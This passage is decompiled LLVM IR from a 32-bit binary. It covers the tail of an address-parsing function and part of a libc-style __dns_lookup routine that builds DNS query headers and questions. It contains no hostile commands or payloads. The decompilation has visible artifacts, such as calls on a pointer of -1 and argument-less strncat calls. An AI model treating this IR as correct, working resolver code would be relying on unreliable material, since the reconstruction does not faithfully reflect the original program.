  br i1 %v5_8054d18, label %dec_label_pc_8054d22, label %dec_label_pc_8054d1a

dec_label_pc_8054d1a:                             ; preds = %dec_label_pc_8054d14
  %v10_8054d1a = icmp eq i8 %v2_8054d06, 46
  %v1_8054d1d = icmp eq i1 %v10_8054d1a, false
  br i1 %v1_8054d1d, label %dec_label_pc_8054d54, label %dec_label_pc_8054d1f

dec_label_pc_8054d1f:                             ; preds = %dec_label_pc_8054d1a
  %v1_8054d1f = add i32 %v0_8054d05, 1
  store i32 %v1_8054d1f, i32* @ecx, align 4
  br label %dec_label_pc_8054d2b

dec_label_pc_8054d22:                             ; preds = %dec_label_pc_8054d14
  %v1_8054d22 = add i32 %v0_8054d05, 1
  store i32 %v1_8054d22, i32* @ecx, align 4
  %v4_8054d23 = icmp eq i8 %v2_8054d06, 0
  br i1 %v4_8054d23, label %dec_label_pc_8054d2b, label %dec_label_pc_8054d27

dec_label_pc_8054d27:                             ; preds = %dec_label_pc_8054d22
  %v2_8054d27 = and i16 %v5_8054d0b, 32
  %v3_8054d27 = icmp eq i16 %v2_8054d27, 0
  br i1 %v3_8054d27, label %dec_label_pc_8054d54, label %dec_label_pc_8054d2b

dec_label_pc_8054d2b:                             ; preds = %dec_label_pc_8054d27, %dec_label_pc_8054d22, %dec_label_pc_8054d1f
  %v0_8054ce23 = phi i32 [ %v1_8054d22, %dec_label_pc_8054d27 ], [ %v1_8054d22, %dec_label_pc_8054d22 ], [ %v1_8054d1f, %dec_label_pc_8054d1f ]
  %v2_8054d2b = mul i32 %v0_8054d4933, 256
  %v3_8054d2e = add nuw nsw i32 %v2_8054d2e35, 1
  %v2_8054d31 = or i32 %v1_8054cf6, %v2_8054d2b
  %v7_8054d37 = icmp sgt i32 %v2_8054d2e35, 3
  br i1 %v7_8054d37, label %dec_label_pc_8054d39, label %dec_label_pc_8054ce2

dec_label_pc_8054d39:                             ; preds = %dec_label_pc_8054d2b
  %v4_8054d3e = icmp eq i32 %arg2, 0
  br i1 %v4_8054d3e, label %dec_label_pc_8054d56, label %dec_label_pc_8054d45

dec_label_pc_8054d45:                             ; preds = %dec_label_pc_8054d39
  %v1_8054d49 = call i32 @llvm.bswap.i32(i32 %v2_8054d31)
  %v2_8054d4b = inttoptr i32 %arg2 to i32*
  store i32 %v1_8054d49, i32* %v2_8054d4b, align 4
  br label %dec_label_pc_8054d56

dec_label_pc_8054d54:                             ; preds = %dec_label_pc_8054d27, %dec_label_pc_8054d1a, %dec_label_pc_8054ce2, %dec_label_pc_8054cf6, %entry
  br label %dec_label_pc_8054d56

dec_label_pc_8054d56:                             ; preds = %dec_label_pc_8054d39, %dec_label_pc_8054d45, %dec_label_pc_8054d54
  %v0_8054d5b = phi i32 [ 1, %dec_label_pc_8054d39 ], [ 1, %dec_label_pc_8054d45 ], [ 0, %dec_label_pc_8054d54 ]
  ret i32 %v0_8054d5b

; uselistorder directives
  uselistorder i32 %v2_8054d08, { 1, 0 }
  uselistorder i32 %v6_8054d06, { 1, 0 }
  uselistorder i8 %v2_8054d06, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054d05, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8054cfd, { 1, 0 }
  uselistorder i32 %v3_8054cf9, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8054ce234, { 1, 0 }
  uselistorder i32 %v2_8054d2e35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054d56, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054d54, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8054d06, { 1, 0 }
  uselistorder label %dec_label_pc_8054ce2, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8054d72 = call i32 @malloc(i32 512)
  store i32 %v2_8054d72, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8054d72, i32* @ebp, align 4
  %v2_8054d80 = call i32 @malloc(i32 1025)
  store i32 %v2_8054d80, i32* %eax.global-to-local, align 4
  %v12_8054d89 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8054d8c = icmp eq i32 %v2_8054d72, 0
  br i1 %v1_8054d8c, label %dec_label_pc_8055405, label %dec_label_pc_8054d94

dec_label_pc_8054d94:                             ; preds = %entry
  %v1_8054d94 = icmp eq i32 %v2_8054d80, 0
  br i1 %v1_8054d94, label %dec_label_pc_8055405, label %dec_label_pc_8054d9c

dec_label_pc_8054d9c:                             ; preds = %dec_label_pc_8054d94
  %v5_8054d9c = icmp eq i32 %arg2, 0
  br i1 %v5_8054d9c, label %dec_label_pc_8055405, label %dec_label_pc_8054daa

dec_label_pc_8054daa:                             ; preds = %dec_label_pc_8054d9c
  %v4_8054daa = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054daa, i32* %eax.global-to-local, align 4
  %v2_8054db1 = load i8, i8* %arg1, align 1
  %v3_8054db1 = icmp eq i8 %v2_8054db1, 0
  br i1 %v3_8054db1, label %dec_label_pc_8055405, label %dec_label_pc_8054dba

dec_label_pc_8054dba:                             ; preds = %dec_label_pc_8054daa
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8054dbe = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8054dbe, i32* @eax, align 4
  store i32 %v4_8054daa, i32* %edx.global-to-local, align 4
  %v2_8054de1 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8054de1, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8054de9 = call i32 @__pthread_return_void(i32 %v2_8054de1, i32 134560279)
  store i32 %v3_8054de9, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80677e8.787 to i8*), i8** %stack_var_-252, align 4
  %v2_8054df5 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80677e8.787 to i32))
  %v0_8054dfa = load i64, i64* @global_var_8067800.788, align 8
  %v1_8054dfa = trunc i64 %v0_8054dfa to i32
  %v1_8054dff = ashr i32 %v1_8054dfa, 31
  %v6_8054e00 = and i64 %v0_8054dfa, 4294967295
  %v8_8054e00 = zext i32 %v1_8054dff to i64
  %v9_8054e00 = mul nuw i64 %v8_8054e00, 4294967296
  %v10_8054e00 = or i64 %v9_8054e00, %v6_8054e00
  %v14_8054e00 = srem i64 %v10_8054e00, %tmp33
  %v15_8054e00 = trunc i64 %v14_8054e00 to i32
  %v0_8054e07 = load i16, i16* @global_var_8061544.789, align 4
  %v2_8054e16 = load i8*, i8** %stack_var_-252, align 4
  %v3_8054e16 = ptrtoint i8* %v2_8054e16 to i32
  store i32 %v3_8054e16, i32* @eax, align 4
  store i32 134560279, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8054e1b = call i32 @__pthread_return_void(i32 %v2_8054de1, i32 1)
  store i32 %v3_8054e1b, i32* %eax.global-to-local, align 4
  %v3_8054e5f = sext i16 %v0_8054e07 to i32
  %v5_8054fc2 = inttoptr i32 %v15_8054e00 to i8*
  %v1_80553e087 = add i32 %v12_8054d89, 28
  %v2_80553e088 = inttoptr i32 %v1_80553e087 to i32*
  %v3_80553e089 = load i32, i32* %v2_80553e088, align 4
  %tmp119 = icmp ult i32 %v3_80553e089, 3
  br i1 %tmp119, label %dec_label_pc_8054e40, label %dec_label_pc_8055405

dec_label_pc_8054e40:                             ; preds = %dec_label_pc_8054dba, %dec_label_pc_80553e0.backedge
  %v0_8054e4792 = phi i32 [ %v0_80553e0.pre, %dec_label_pc_80553e0.backedge ], [ %v12_8054d89, %dec_label_pc_8054dba ]
  %v1_8054e40 = add i32 %v0_8054e4792, 20
  %v2_8054e40 = inttoptr i32 %v1_8054e40 to i32*
  %v3_8054e40 = load i32, i32* %v2_8054e40, align 4
  %v13_8054e40 = icmp eq i32 %v3_8054e40, -1
  br i1 %v13_8054e40, label %dec_label_pc_8054e40.dec_label_pc_8054e56_crit_edge, label %dec_label_pc_8054e47

dec_label_pc_8054e40.dec_label_pc_8054e56_crit_edge: ; preds = %dec_label_pc_8054e40
  %v0_8054e56.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054e56

dec_label_pc_8054e47:                             ; preds = %dec_label_pc_8054e40
  %v3_8054e4a = load i32, i32* %v2_8054e40, align 4
  %v5_8054e4a = add i32 %v0_8054e4792, -16
  %v6_8054e4a = inttoptr i32 %v5_8054e4a to i32*
  store i32 %v3_8054e4a, i32* %v6_8054e4a, align 4
  %v1_8054e4e = call i32 @__libc_close(i32 -1)
  store i32 %v1_8054e4e, i32* %eax.global-to-local, align 4
  %v0_8054e53 = load i32, i32* @esp, align 4
  %v1_8054e53 = add i32 %v0_8054e53, 16
  br label %dec_label_pc_8054e56

dec_label_pc_8054e56:                             ; preds = %dec_label_pc_8054e40.dec_label_pc_8054e56_crit_edge, %dec_label_pc_8054e47
  %v1_8054e56 = phi i32 [ %v0_8054e4792, %dec_label_pc_8054e40.dec_label_pc_8054e56_crit_edge ], [ %v1_8054e53, %dec_label_pc_8054e47 ]
  %v0_8054e56 = phi i32 [ %v0_8054e56.pre, %dec_label_pc_8054e40.dec_label_pc_8054e56_crit_edge ], [ %v1_8054e4e, %dec_label_pc_8054e47 ]
  %v2_8054e56 = add i32 %v1_8054e56, -4
  %v3_8054e56 = inttoptr i32 %v2_8054e56 to i32*
  store i32 %v0_8054e56, i32* %v3_8054e56, align 4
  %v1_8054e57 = add i32 %v1_8054e56, -8
  %v2_8054e57 = inttoptr i32 %v1_8054e57 to i32*
  store i32 512, i32* %v2_8054e57, align 4
  %v1_8054e5c = add i32 %v1_8054e56, -12
  %v2_8054e5c = inttoptr i32 %v1_8054e5c to i32*
  store i32 0, i32* %v2_8054e5c, align 4
  %v2_8054e5e = add i32 %v1_8054e56, -16
  %v3_8054e5e = inttoptr i32 %v2_8054e5e to i32*
  store i32 %v2_8054d72, i32* %v3_8054e5e, align 4
  %v5_8054e5f = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8054e00, i32 %v3_8054e5f)
  store i32 %v5_8054e5f, i32* %eax.global-to-local, align 4
  %v0_8054e64 = load i32, i32* @esp, align 4
  %v1_8054e67 = add i32 %v0_8054e64, 8
  %v2_8054e67 = inttoptr i32 %v1_8054e67 to i32*
  store i32 48, i32* %v2_8054e67, align 4
  %v1_8054e69 = add i32 %v0_8054e64, 4
  %v2_8054e69 = inttoptr i32 %v1_8054e69 to i32*
  store i32 0, i32* %v2_8054e69, align 4
  %v1_8054e6b = add i32 %v0_8054e64, 84
  store i32 %v1_8054e6b, i32* @ebx, align 4
  %v3_8054e6f = inttoptr i32 %v0_8054e64 to i32*
  store i32 %v1_8054e6b, i32* %v3_8054e6f, align 4
  %v5_8054e70 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8054e00, i32 %v3_8054e5f)
  store i32 %v5_8054e70, i32* %eax.global-to-local, align 4
  %v0_8054e75 = load i32, i32* @esp, align 4
  %v1_8054e75 = add i32 %v0_8054e75, 60
  %v2_8054e75 = inttoptr i32 %v1_8054e75 to i32*
  %v3_8054e75 = load i32, i32* %v2_8054e75, align 4
  store i32 %v3_8054e75, i32* %eax.global-to-local, align 4
  %v1_8054e79 = add i32 %v0_8054e75, 116
  %v2_8054e79 = inttoptr i32 %v1_8054e79 to i32*
  store i32 1, i32* %v2_8054e79, align 4
  %v0_8054e81 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e81 = add i32 %v0_8054e81, 1
  %v0_8054e82 = load i32, i32* @esp, align 4
  %v1_8054e82 = add i32 %v0_8054e82, 104
  %v2_8054e82 = inttoptr i32 %v1_8054e82 to i32*
  store i32 1, i32* %v2_8054e82, align 4
  %v1_8054e8a = urem i32 %v1_8054e81, 65536
  store i32 %v1_8054e8a, i32* %eax.global-to-local, align 4
  %v1_8054e8f = load i32, i32* @esp, align 4
  %v2_8054e8f = add i32 %v1_8054e8f, 60
  %v3_8054e8f = inttoptr i32 %v2_8054e8f to i32*
  store i32 %v1_8054e8a, i32* %v3_8054e8f, align 4
  %v0_8054e93 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e93 = load i32, i32* @esp, align 4
  %v2_8054e93 = add i32 %v1_8054e93, 84
  %v3_8054e93 = inttoptr i32 %v2_8054e93 to i32*
  store i32 %v0_8054e93, i32* %v3_8054e93, align 4
  %v0_8054e97 = load i32, i32* @esp, align 4
  %v1_8054e9a = add i32 %v0_8054e97, 8
  %v2_8054e9a = inttoptr i32 %v1_8054e9a to i32*
  store i32 512, i32* %v2_8054e9a, align 4
  %v2_8054e9f = add i32 %v0_8054e97, 4
  %v3_8054e9f = inttoptr i32 %v2_8054e9f to i32*
  store i32 %v2_8054d72, i32* %v3_8054e9f, align 4
  %v0_8054ea0 = load i32, i32* @ebx, align 4
  %v3_8054ea0 = inttoptr i32 %v0_8054e97 to i32*
  store i32 %v0_8054ea0, i32* %v3_8054ea0, align 4
  %v0_8054ea1 = call i32 @__encode_header()
  store i32 %v0_8054ea1, i32* %eax.global-to-local, align 4
  %v0_8054ea6 = load i32, i32* @esp, align 4
  store i32 %v0_8054ea1, i32* @ebx, align 4
  %v2_8054eab = icmp slt i32 %v0_8054ea1, 0
  br i1 %v2_8054eab, label %dec_label_pc_8055405, label %dec_label_pc_8054eb3

dec_label_pc_8054eb3:                             ; preds = %dec_label_pc_8054e56
  %v2_8054eb3 = add i32 %v0_8054ea6, 12
  %v3_8054eb3 = inttoptr i32 %v2_8054eb3 to i32*
  store i32 %v0_8054ea1, i32* %v3_8054eb3, align 4
  %v1_8054eb4 = add i32 %v0_8054ea6, 8
  %v2_8054eb4 = inttoptr i32 %v1_8054eb4 to i32*
  store i32 1025, i32* %v2_8054eb4, align 4
  %v1_8054eb9 = add i32 %v0_8054ea6, 256
  %v2_8054eb9 = inttoptr i32 %v1_8054eb9 to i32*
  %v3_8054eb9 = load i32, i32* %v2_8054eb9, align 4
  %v5_8054eb9 = add i32 %v0_8054ea6, 4
  %v6_8054eb9 = inttoptr i32 %v5_8054eb9 to i32*
  store i32 %v3_8054eb9, i32* %v6_8054eb9, align 4
  %v1_8054ec0 = add i32 %v0_8054ea6, 28
  %v2_8054ec0 = inttoptr i32 %v1_8054ec0 to i32*
  %v3_8054ec0 = load i32, i32* %v2_8054ec0, align 4
  %v6_8054ec0 = inttoptr i32 %v0_8054ea6 to i32*
  store i32 %v3_8054ec0, i32* %v6_8054ec0, align 4
  %v5_8054ec4 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8054e00, i32 %v3_8054e5f)
  %v0_8054ec9 = load i32, i32* @esp, align 4
  %v1_8054ecc = add i32 %v0_8054ec9, 8
  %v2_8054ecc = inttoptr i32 %v1_8054ecc to i32*
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* %v2_8054ecc, align 4
  %v1_8054ed1 = add i32 %v0_8054ec9, 4
  %v2_8054ed1 = inttoptr i32 %v1_8054ed1 to i32*
  store i32 134560279, i32* %v2_8054ed1, align 4
  %v1_8054ed6 = add i32 %v0_8054ec9, 200
  store i32 %v1_8054ed6, i32* @eax, align 4
  %v3_8054edd = inttoptr i32 %v0_8054ec9 to i32*
  store i32 %v1_8054ed6, i32* %v3_8054edd, align 4
  %v2_8054ede = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_8054ede, i32* %eax.global-to-local, align 4
  %v0_8054ee3 = load i32, i32* @esp, align 4
  %v1_8054ee3 = inttoptr i32 %v0_8054ee3 to i32*
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* %v1_8054ee3, align 4
  %v1_8054eea = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8054eea, i32* %eax.global-to-local, align 4
  %v0_8054eef = load i32, i32* @esp, align 4
  %v1_8054eef = add i32 %v0_8054eef, 56
  %v2_8054eef = inttoptr i32 %v1_8054eef to i32*
  %v3_8054eef = load i32, i32* %v2_8054eef, align 4
  store i32 %v3_8054eef, i32* %edx.global-to-local, align 4
  %v1_8054ef3 = add i32 %v0_8054eef, 268
  %v2_8054ef3 = inttoptr i32 %v1_8054ef3 to i32*
  %v3_8054ef3 = load i32, i32* %v2_8054ef3, align 4
  store i32 %v3_8054ef3, i32* %eax.global-to-local, align 4
  %v2_8054efa = mul i32 %v3_8054eef, 4
  %v3_8054efa = add i32 %v3_8054ef3, %v2_8054efa
  %v4_8054efa = inttoptr i32 %v3_8054efa to i32*
  %v5_8054efa = load i32, i32* %v4_8054efa, align 4
  store i32 %v5_8054efa, i32* %edx.global-to-local, align 4
  %v2_8054efd = add i32 %v0_8054eef, 48
  %v3_8054efd = inttoptr i32 %v2_8054efd to i32*
  store i32 %v5_8054efa, i32* %v3_8054efd, align 4
  %v0_8054f01 = load i32, i32* @esp, align 4
  %v1_8054f01 = add i32 %v0_8054f01, 16
  %v1_8054f04 = add i32 %v0_8054f01, 52
  %v2_8054f04 = inttoptr i32 %v1_8054f04 to i32*
  %v3_8054f04 = load i32, i32* %v2_8054f04, align 4
  %v5_8054f04 = icmp slt i32 %v3_8054f04, 0
  br i1 %v5_8054f04, label %dec_label_pc_8054eb3.dec_label_pc_8054f4a_crit_edge, label %dec_label_pc_8054f0b

dec_label_pc_8054eb3.dec_label_pc_8054f4a_crit_edge: ; preds = %dec_label_pc_8054eb3
  %v0_8054f4a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054f4a

dec_label_pc_8054f0b:                             ; preds = %dec_label_pc_8054eb3
  store i32 %v3_8054f04, i32* %eax.global-to-local, align 4
  %v1_8054f0f = load i32, i32* @global_var_8067c38.790, align 8
  %v2_8054f0f = sub i32 %v3_8054f04, %v1_8054f0f
  %v8_8054f0f = xor i32 %v1_8054f0f, %v3_8054f04
  %v9_8054f0f = xor i32 %v2_8054f0f, %v3_8054f04
  %v10_8054f0f = and i32 %v9_8054f0f, %v8_8054f0f
  %v11_8054f0f = icmp slt i32 %v10_8054f0f, 0
  %v13_8054f0f = icmp slt i32 %v2_8054f0f, 0
  %v2_8054f15 = icmp eq i1 %v13_8054f0f, %v11_8054f0f
  br i1 %v2_8054f15, label %dec_label_pc_8054f4a, label %dec_label_pc_8054f17

dec_label_pc_8054f17:                             ; preds = %dec_label_pc_8054f0b
  %v2_8054f17 = add i32 %v0_8054f01, 12
  %v3_8054f17 = inttoptr i32 %v2_8054f17 to i32*
  store i32 %v3_8054f04, i32* %v3_8054f17, align 4
  %v1_8054f18 = add i32 %v0_8054f01, 8
  %v2_8054f18 = inttoptr i32 %v1_8054f18 to i32*
  store i32 1025, i32* %v2_8054f18, align 4
  %v1_8054f1d = add i32 %v0_8054f01, 4
  %v2_8054f1d = inttoptr i32 %v1_8054f1d to i32*
  store i32 ptrtoint (i32* @global_var_8060f3c.791 to i32), i32* %v2_8054f1d, align 4
  %v1_8054f22 = add i32 %v0_8054f01, 28
  %v2_8054f22 = inttoptr i32 %v1_8054f22 to i32*
  %v3_8054f22 = load i32, i32* %v2_8054f22, align 4
  %v6_8054f22 = inttoptr i32 %v0_8054f01 to i32*
  store i32 %v3_8054f22, i32* %v6_8054f22, align 4
  %v0_8054f26 = call i32 @__GI_strncat()
  store i32 %v0_8054f26, i32* %eax.global-to-local, align 4
  %v0_8054f2b = load i32, i32* @esp, align 4
  %v1_8054f2e = add i32 %v0_8054f2b, 8
  %v2_8054f2e = inttoptr i32 %v1_8054f2e to i32*
  store i32 1025, i32* %v2_8054f2e, align 4
  %v1_8054f33 = add i32 %v0_8054f2b, 52
  %v2_8054f33 = inttoptr i32 %v1_8054f33 to i32*
  %v3_8054f33 = load i32, i32* %v2_8054f33, align 4
  store i32 %v3_8054f33, i32* %edx.global-to-local, align 4
  %v1_8054f37 = mul i32 %v3_8054f33, 4
  %v2_8054f37 = add i32 %v1_8054f37, 134642712
  %v3_8054f37 = inttoptr i32 %v2_8054f37 to i32*
  %v4_8054f37 = load i32, i32* %v3_8054f37, align 4
  %v6_8054f37 = add i32 %v0_8054f2b, 4
  %v7_8054f37 = inttoptr i32 %v6_8054f37 to i32*
  store i32 %v4_8054f37, i32* %v7_8054f37, align 4
  %v1_8054f3e = add i32 %v0_8054f2b, 28
  %v2_8054f3e = inttoptr i32 %v1_8054f3e to i32*
  %v3_8054f3e = load i32, i32* %v2_8054f3e, align 4
  %v6_8054f3e = inttoptr i32 %v0_8054f2b to i32*
  store i32 %v3_8054f3e, i32* %v6_8054f3e, align 4
  %v0_8054f42 = call i32 @__GI_strncat()
  store i32 %v0_8054f42, i32* %eax.global-to-local, align 4
  %v0_8054f47 = load i32, i32* @esp, align 4
  %v1_8054f47 = add i32 %v0_8054f47, 16
  br label %dec_label_pc_8054f4a

dec_label_pc_8054f4a:                             ; preds = %dec_label_pc_8054eb3.dec_label_pc_8054f4a_crit_edge, %dec_label_pc_8054f0b, %dec_label_pc_8054f17
  %v1_8054f4a = phi i32 [ %v1_8054f01, %dec_label_pc_8054eb3.dec_label_pc_8054f4a_crit_edge ], [ %v1_8054f01, %dec_label_pc_8054f0b ], [ %v1_8054f47, %dec_label_pc_8054f17 ]
  %v0_8054f4a = phi i32 [ %v0_8054f4a.pre, %dec_label_pc_8054eb3.dec_label_pc_8054f4a_crit_edge ], [ %v3_8054f04, %dec_label_pc_8054f0b ], [ %v0_8054f42, %dec_label_pc_8054f17 ]
  %v2_8054f4a = add i32 %v1_8054f4a, -4
  %v3_8054f4a = inttoptr i32 %v2_8054f4a to i32*
  store i32 %v0_8054f4a, i32* %v3_8054f4a, align 4
  %v0_8054f4b = load i32, i32* %eax.global-to-local, align 4
  %v2_8054f4b = add i32 %v1_8054f4a, -8
  %v3_8054f4b = inttoptr i32 %v2_8054f4b to i32*
  store i32 %v0_8054f4b, i32* %v3_8054f4b, align 4
  %v1_8054f4c = add i32 %v1_8054f4a, -12
  %v2_8054f4c = inttoptr i32 %v1_8054f4c to i32*
  store i32 1, i32* %v2_8054f4c, align 4
  %v1_8054f4e = add i32 %v1_8054f4a, 184
  store i32 %v1_8054f4e, i32* @eax, align 4
  %v2_8054f55 = add i32 %v1_8054f4a, -16
  %v3_8054f55 = inttoptr i32 %v2_8054f55 to i32*
  store i32 %v1_8054f4e, i32* %v3_8054f55, align 4
  %v2_8054f56 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8054e00)
  store i32 %v2_8054f56, i32* %eax.global-to-local, align 4
  %v0_8054f5b = load i32, i32* @esp, align 4
  %v1_8054f5b = add i32 %v0_8054f5b, 28
  %v2_8054f5b = inttoptr i32 %v1_8054f5b to i32*
  %v3_8054f5b = load i32, i32* %v2_8054f5b, align 4
  store i32 %v3_8054f5b, i32* %eax.global-to-local, align 4
  %v1_8054f5f = add i32 %v0_8054f5b, 260
  %v2_8054f5f = inttoptr i32 %v1_8054f5f to i32*
  %v3_8054f5f = load i32, i32* %v2_8054f5f, align 4
  store i32 %v3_8054f5f, i32* @edx, align 4
  %v2_8054f66 = add i32 %v0_8054f5b, 216
  %v3_8054f66 = inttoptr i32 %v2_8054f66 to i32*
  store i32 %v3_8054f5b, i32* %v3_8054f66, align 4
  %v0_8054f6d = load i32, i32* @edx, align 4
  %v1_8054f6d = load i32, i32* @esp, align 4
  %v2_8054f6d = add i32 %v1_8054f6d, 220
  %v3_8054f6d = inttoptr i32 %v2_8054f6d to i32*
  store i32 %v0_8054f6d, i32* %v3_8054f6d, align 4
  %v0_8054f74 = load i32, i32* @esp, align 4
  %v1_8054f74 = add i32 %v0_8054f74, 224
  %v2_8054f74 = inttoptr i32 %v1_8054f74 to i32*
  store i32 1, i32* %v2_8054f74, align 4
  %v0_8054f84 = load i32, i32* @esp, align 4
  %v1_8054f87 = load i32, i32* @ebx, align 4
  %v2_8054f87 = sub i32 512, %v1_8054f87
  %v2_8054f89 = add i32 %v0_8054f84, 8
  %v3_8054f89 = inttoptr i32 %v2_8054f89 to i32*
  store i32 %v2_8054f87, i32* %v3_8054f89, align 4
  %v1_8054f8a = load i32, i32* @ebx, align 4
  %v2_8054f8a = add i32 %v1_8054f8a, %v2_8054d72
  %v2_8054f8e = add i32 %v0_8054f84, 4
  %v3_8054f8e = inttoptr i32 %v2_8054f8e to i32*
  store i32 %v2_8054f8a, i32* %v3_8054f8e, align 4
  %v1_8054f8f = add i32 %v0_8054f84, 216
  store i32 %v1_8054f8f, i32* @eax, align 4
  %v3_8054f96 = inttoptr i32 %v0_8054f84 to i32*
  store i32 %v1_8054f8f, i32* %v3_8054f96, align 4
  %v0_8054f97 = call i32 @__encode_question()
  store i32 %v0_8054f97, i32* %eax.global-to-local, align 4
  %v0_8054f9c = load i32, i32* @esp, align 4
  store i32 %v0_8054f97, i32* @esi, align 4
  %v2_8054fa1 = icmp slt i32 %v0_8054f97, 0
  br i1 %v2_8054fa1, label %dec_label_pc_8055405, label %dec_label_pc_8054fa9

dec_label_pc_8054fa9:                             ; preds = %dec_label_pc_8054f4a
  %v1_8054fa9 = add i32 %v0_8054f9c, 172
  %v2_8054fa9 = inttoptr i32 %v1_8054fa9 to i16*
  store i16 2, i16* %v2_8054fa9, align 2
  %v1_8054fb3 = load i32, i32* @esp, align 4
  %v2_8054fb3 = add i32 %v1_8054fb3, -4
  %v3_8054fb3 = inttoptr i32 %v2_8054fb3 to i32*
  store i32 %v0_8054f97, i32* %v3_8054fb3, align 4
  %v1_8054fb4 = add i32 %v1_8054fb3, 164
  store i32 %v1_8054fb4, i32* %eax.global-to-local, align 4
  %v2_8054fbb = add i32 %v1_8054fb3, -8
  %v3_8054fbb = inttoptr i32 %v2_8054fbb to i32*
  store i32 %v1_8054fb4, i32* %v3_8054fbb, align 4
  %v1_8054fbc = add i32 %v1_8054fb3, 32
  %v2_8054fbc = inttoptr i32 %v1_8054fbc to i32*
  %v3_8054fbc = load i32, i32* %v2_8054fbc, align 4
  %v5_8054fbc = add i32 %v1_8054fb3, -12
  %v6_8054fbc = inttoptr i32 %v5_8054fbc to i32*
  store i32 %v3_8054fbc, i32* %v6_8054fbc, align 4
  %v1_8054fc0 = add i32 %v1_8054fb3, -16
  %v2_8054fc0 = inttoptr i32 %v1_8054fc0 to i32*
  store i32 10, i32* %v2_8054fc0, align 4
  %v6_8054fc2 = call i32 @inet_pton(i32 -1, i8* %v5_8054fc2, i32 %v3_8054e5f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8054fc2, i32* %eax.global-to-local, align 4
  %v0_8054fc7 = load i32, i32* @esp, align 4
  %v1_8054fc7 = add i32 %v0_8054fc7, 16
  %tmp47 = icmp slt i32 %v6_8054fc2, 1
  br i1 %tmp47, label %dec_label_pc_8054fd8, label %dec_label_pc_8054fce

dec_label_pc_8054fce:                             ; preds = %dec_label_pc_8054fa9
  %v1_8054fce = add i32 %v0_8054fc7, 172
  %v2_8054fce = inttoptr i32 %v1_8054fce to i16*
  store i16 10, i16* %v2_8054fce, align 2
  %v0_8054fd8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054fd8

dec_label_pc_8054fd8:                             ; preds = %dec_label_pc_8054fa9, %dec_label_pc_8054fce
  %v0_8054fef = phi i32 [ %v1_8054fc7, %dec_label_pc_8054fa9 ], [ %v0_8054fd8.pre, %dec_label_pc_8054fce ]
  %v1_8054fd8 = add i32 %v0_8054fef, 156
  %v2_8054fd8 = inttoptr i32 %v1_8054fd8 to i16*
  %v3_8054fd8 = load i16, i16* %v2_8054fd8, align 2
  %v12_8054fd8 = icmp eq i16 %v3_8054fd8, 10
  %v1_8054fe1 = icmp eq i1 %v12_8054fd8, false
  %v1_8054fef = add i32 %v0_8054fef, 158
  %v2_8054fef = inttoptr i32 %v1_8054fef to i16*
  store i16 13568, i16* %v2_8054fef, align 2
  %v0_8054ff9 = load i32, i32* @esp, align 4
  br i1 %v1_8054fe1, label %dec_label_pc_8054fef, label %dec_label_pc_805500f

dec_label_pc_8054fef:                             ; preds = %dec_label_pc_8054fd8
  %v1_8054ffc = add i32 %v0_8054ff9, 32
  %v2_8054ffc = inttoptr i32 %v1_8054ffc to i32*
  %v3_8054ffc = load i32, i32* %v2_8054ffc, align 4
  %v5_8054ffc = add i32 %v0_8054ff9, -16
  %v6_8054ffc = inttoptr i32 %v5_8054ffc to i32*
  store i32 %v3_8054ffc, i32* %v6_8054ffc, align 4
  %v1_8055000 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8055000, i32* %eax.global-to-local, align 4
  %v1_8055005 = load i32, i32* @esp, align 4
  %v2_8055005 = add i32 %v1_8055005, 176
  %v3_8055005 = inttoptr i32 %v2_8055005 to i32*
  store i32 %v1_8055000, i32* %v3_8055005, align 4
  %v0_805500c = load i32, i32* @esp, align 4
  %v1_805500c = add i32 %v0_805500c, 16
  br label %dec_label_pc_805500f

dec_label_pc_805500f:                             ; preds = %dec_label_pc_8054fd8, %dec_label_pc_8054fef
